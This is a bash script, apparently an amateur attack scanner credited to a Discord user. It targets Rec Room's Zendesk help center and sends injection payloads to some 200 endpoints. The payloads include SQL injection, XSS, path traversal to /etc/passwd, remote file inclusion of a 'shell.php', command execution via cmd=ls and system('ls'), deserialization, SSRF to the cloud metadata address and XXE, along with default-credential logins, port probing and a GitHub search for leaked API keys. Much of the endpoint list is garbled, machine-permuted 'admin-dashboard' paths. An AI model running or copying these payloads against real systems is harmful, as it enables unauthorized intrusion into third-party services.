#!/bin/bash

OUTPUT_FILE="recroom_zendesk_full_config_test_results.txt"

log_message() {
    echo "$1" >> $OUTPUT_FILE
}

test_endpoint() {
    local endpoint=$1
    log_message "Testing endpoint: $endpoint"
    echo "Testing endpoint: $endpoint"

    start_time=$(date +%s)

    curl -s -F "file=@test.php" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?cmd=ls" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s -d "data=O:8:\"Exploit\":0:{}" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint/api/v1/data" >> $OUTPUT_FILE 2>&1
    nc -zv "$DOMAIN" 80 443 >> $OUTPUT_FILE 2>&1
    curl -s "https://github.com/search?q=$DOMAIN+api+key" >> $OUTPUT_FILE 2>&1

    for param in "author" "tag" "month" "view" "format=json" "format=page-context" "format=main-content" "format=json-pretty" "format=ical" "reversePaginate"; do
        curl -s "$DOMAIN$endpoint?$param=test" >> $OUTPUT_FILE 2>&1
    done

    curl -s "$DOMAIN$endpoint?id=1' OR '1'='1" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?q=<script>alert(1)</script>" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?file=../../../../etc/passwd" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?file=http://example.com/shell.php" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?url=http://169.254.169.254/" >> $OUTPUT_FILE 2>&1
    curl -s -d "@xxe_payload.xml" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s -X POST -d "csrf_token=test&action=delete" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?redirect=http://example.com" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?file=../../../../etc/passwd" >> $OUTPUT_FILE 2>&1
    curl -s -d "code=system('ls')" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1

    for id in 1 2; do
        curl -s "$DOMAIN$endpoint?id=$id" >> $OUTPUT_FILE 2>&1
    done

    curl -s -d "username=admin&password=admin" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1

    log_message "Checking for Rate Limiting for $endpoint:"
    curl -s -X POST "$DOMAIN$endpoint" -d "username=admin&password=admin" >> $OUTPUT_FILE 2>&1
    curl -s -X POST "$DOMAIN$endpoint" -d "username=admin&password=admin" >> $OUTPUT_FILE 2>&1
    curl -s -X POST "$DOMAIN$endpoint" -d "username=admin&password=admin" >> $OUTPUT_FILE 2>&1

    log_message "Checking for Session Management for $endpoint:"
    curl -s -I "$DOMAIN$endpoint" | grep -i "Set-Cookie" >> $OUTPUT_FILE 2>&1

    log_message "Checking for Allowed HTTP Methods for $endpoint:"
    curl -s -X OPTIONS "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1

    log_message "Checking for Directory Listing for $endpoint:"
    curl -s "$DOMAIN$endpoint/" >> $OUTPUT_FILE 2>&1

    log_message "Checking for Content Security Policy for $endpoint:"
    curl -s -I "$DOMAIN$endpoint" | grep -i "Content-Security-Policy" >> $OUTPUT_FILE 2>&1

    end_time=$(date +%s)
    elapsed_time=$((end_time - start_time))
    echo "Finished testing endpoint: $endpoint in $elapsed_time seconds"
}

echo "Enter the domain you want to test (e.g., https://example.com):"
read DOMAIN

if [[ -z "$DOMAIN" ]]; then
    echo "No domain provided. Exiting."
    exit 1
fi

ENDPOINTS=(
    "/children"
    "/groups"
    "/organizations"
    "/requests"
    "/registration"
    "/plans"
    "/accounts"
    "/account"
    "/proxy"
    "/rules"
    "/tags"
    "/ticket_fields"
    "/reports"
    "/search"
    "/slas"
    "/integrations"
    "/users"
    "/suspended_tickets"
    "/events"
    "/console"
    "/requests/*/satisfaction/"
    "/hc/activity"
    "/hc/change_language/"
    "/hc/communities/public/topics/*?*filter="
    "/hc/communities/public/questions$"
    "/hc/communities/public/questions?*filter="
    "/hc/communities/public/questions/unanswered"
    "/hc/*/signin"
    "/hc/requests/"
    "/hc/*/requests/"
    "/hc/*/search"
    "/access/normal"
    "/access/sso_bypass"
    "/access/unauthenticated"
    "/theming"
    "/knowledge"
    "/access/"
    "/auth/"
    "/cdn-cgi/"
    "/tickets"
    "/api/v1"
    "/api/v2"
    "/api/v3"
    "/api/v4"
    "/api/v5"
    "/aadmin"
    "/admin"
    "/administrator"
    "/backup"
    "/cgi-bin"
    "/config"
    "/console"
    "/dashboard"
    "/db"
    "/debug"
    "/editor"
    "/ftp"
    "/git"
    "/install"
    "/login"
    "/manager"
    "/phpmyadmin"
    "/setup"
    "/ssh"
    "/status"
    "/svn"
    "/test"
    "/upload"
    "/user"
    "/web"
    "/wp-admin"
    "/wp-content"
    "/wp-includes"
    "/.env"
    "/.git"
    "/.svn"
    "/.htaccess"
    "/.htpasswd"
    "/.bash_history"
    "/.ssh"
    "/.well-known"
    "/robots.txt"
    "/sitemap.xml"
    "/crossdomain.xml"
    "/clientaccesspolicy.xml"
    "/favicon.ico"
    "/humans.txt"
    "/README.md"
    "/LICENSE.md"
    "/CHANGELOG.md"
    "/CONTRIBUTING.md"
    "/CODE_OF_CONDUCT.md"
    "/SECURITY.md"
    "/panel"
    "/control"
    "/manage"
    "/settings"
    "/configurations"
    "/preferences"
    "/profile"
    "/account-settings"
    "/user-settings"
    "/admin-panel"
    "/control-panel"
    "/management"
    "/system"
    "/dashboard-admin"
    "/admin-dashboard"
    "/admin-control"
    "/admin-settings"
    "/admin-config"
    "/admin-preferences"
    "/admin-profile"
    "/admin-account"
    "/admin-user"
    "/admin-system"
    "/admin-management"
    "/admin-dashboard"
    "/admin-control-panel"
    "/admin-management-panel"
    "/admin-system-panel"
    "/admin-dashboard-panel"
    "/admin-control-dashboard"
    "/admin-management-dashboard"
    "/admin-system-dashboard"
    "/admin-panel-dashboard"
    "/admin-control-panel-dashboard"
    "/admin-management-panel-dashboard"
    "/admin-system-panel-dashboard"
    "/admin-dashboard-control-panel"
    "/admin-dashboard-management-panel"
    "/admin-dashboard-system-panel"
    "/admin-dashboard-panel-control"
    "/admin-dashboard-panel-management"
    "/admin-dashboard-panel-system"
    "/admin-dashboard-control-panel-management"
    "/admin-dashboard-control-panel-system"
    "/admin-dashboard-management-panel-control"
    "/admin-dashboard-management-panel-system"
    "/admin-dashboard-system-panel-control"
    "/admin-dashboard-system-panel-management"
    "/admin-dashboard-control-management-system"
    "/admin-dashboard-management-control-system"
    "/admin-dashboard-system-control-management"
    "/admin-dashboard-control-system-management"
    "/admin-dashboard-management-system-control"
    "/admin-dashboard-system-management-control"
    "/admin-dashboard-control-system-management-panel"
    "/admin-dashboard-management-system-control-panel"
    "/admin-dashboard-system-management-control-panel"
    "/admin-dashboard-control-management-system-panel"
    "/admin-dashboard-management-control-system-panel"
    "/admin-dashboard-system-control-management-panel"
    "/admin-dashboard-control-system-management-panel-dashboard"
    "/admin-dashboard-management-system-control-panel-dashboard"
    "/admin-dashboard-system-management-control-panel-dashboard"
    "/admin-dashboard-control-management-system-panel-dashboard"
    "/admin-dashboard-management-control-system-panel-dashboard"
    "/admin-dashboard-system-control-management-panel-dashboard"
    "/admin-dashboard-control-management-system-panel-dashboard-admin"
    "/admin-dashboard-management-system-control-panel-dashboard-admin"
    "/admin-dashboard-system-management-control-panel-dashboard-admin"
    "/admin-dashboard-control-management-system-panel-dashboard-admin"
    "/admin-dashboard-management-control-system-panel-dashboard-admin"
    "/admin-dashboard-system-control-management-panel-dashboard-admin"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control"
    "/admin-dashboard-management-system-control-panel-dashboard-admin-control"
    "/admin-dashboard-system-management-control-panel-dashboard-admin-control"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control"
    "/admin-dashboard-management-control-system-panel-dashboard-admin-control"
    "/admin-dashboard-system-control-management-panel-dashboard-admin-control"
    "/admin-dashboard-control-management-panel-dashboard-admin-control-panel"
    "/admin-dashboard-management-system-control-panel-dashboard-admin-control-panel"
    "/admin-dashboard-system-management-control-panel-dashboard-admin-control-panel"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel"
    "/admin-dashboard-management-control-system-panel-dashboard-admin-control-panel"
    "/admin-dashboard-system-control-management-panel-dashboard-admin-control-panel"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-management-system-control-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-system-management-control-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-management-control-system-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-system-control-management-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-management-system-control-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-system-management-control-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-management-control-system-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-system-control-management-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel-management-system-control"
    "/admin-dashboard-management-system-control-panel-dashboard-admin-control-panel-management-system-control"
)

total_endpoints=${#ENDPOINTS[@]}
for ((i=0; i<total_endpoints; i++)); do
    test_endpoint "${ENDPOINTS[i]}"
    remaining=$((total_endpoints - i - 1))
    echo "Remaining endpoints: $remaining"
    echo "Estimated time left: $((remaining * 5)) seconds"
done

log_message "Testing completed."
echo "Script developed by iNukedYou on Discord."